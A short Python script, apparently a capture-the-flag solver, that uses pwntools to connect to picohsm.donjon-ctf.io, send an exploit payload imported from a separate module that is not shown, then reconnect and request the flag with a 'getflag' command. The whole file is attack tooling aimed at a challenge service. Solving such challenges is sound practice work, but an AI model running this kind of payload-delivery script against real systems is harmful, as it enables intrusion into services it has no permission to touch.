#!/usr/bin/env python3

import pwn
import time
import random
import string
import logging
import struct
import sys

DO_STG2_ONLY = False
PORT = 8005
if len(sys.argv) == 2:
  if sys.argv[1] == "go":
    print("Stage 1 skip")
    DO_STG2_ONLY = True
  else:
    print("Overriding port")
    PORT = int(sys.argv[1])

pwn.context.log_level = logging.CRITICAL

from payload import READ_PAYLOAD

if DO_STG2_ONLY is False:
  p = pwn.remote("picohsm.donjon-ctf.io",PORT)
  print(p.recv(1024,timeout=2.0))
  p.send(READ_PAYLOAD)
  try:
    print(p.recvall(timeout=2.0))
    print(p.recvall(timeout=2.0))
  except:
    print("fuck")

  p.close()
  print("Done!")
  time.sleep(1.0)

print("Attempting second connection...")
p = pwn.remote("picohsm.donjon-ctf.io",PORT)
print(p.recv(1024,timeout=2.0))
p.send("getflag 11111111\n")
print(p.recv(1024,timeout=2.0))
p.close()

